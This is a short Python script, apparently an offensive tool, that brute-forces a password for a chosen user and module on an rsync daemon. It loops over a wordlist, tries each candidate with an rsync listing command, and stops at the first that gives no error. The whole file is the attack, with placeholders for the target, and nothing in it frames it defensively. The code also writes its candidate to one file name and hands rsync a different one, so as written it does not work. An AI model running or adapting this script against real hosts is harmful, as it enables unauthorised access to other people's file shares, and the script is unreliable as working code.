#!/usr/bin/env python3
``` invoke with python3 filename /path/to/wordlist```

import sys
import subprocess
from subprocess import PIPE

wordlist = sys.argv[1] # get from input
tgtuser = 'USERNAME' # change to the user name you are attacking
tgtaddr = 'IPADDRESS' # ipv4 or ipv6 address
tgtprt = 1234 #Port number where Rysnc is running
tgtmod = 'TARGET_MODULE' # for example, home_username 

tgtcmd = "rsync://{}@[{}]:{}/{}".format(tgtuser,tgtaddr,tgtprt,tgtmod)

f = open(wordlist,'r',errors='ignore')
words = f.readlines()

for x in words:
    password = x.rstrip()
    pf = open("passwordfile","w+") # you probably want to create this file first and make sure it is chmod 600
    pf.write(password)
    pf.close()
    p = subprocess.run(['rsync','-av','--password-file=pass','--list-only',tgtcmd],stdout=PIPE,stderr=PIPE)
    rsync_error = p.stderr.decode('utf-8')
    rsync_output = p.stdout.decode('utf-8')
    if rsync_error.find("ERROR") >0:
        print("Password: {} failed".format(password))
    else:
        print("Check password: {}".format(password))
        break
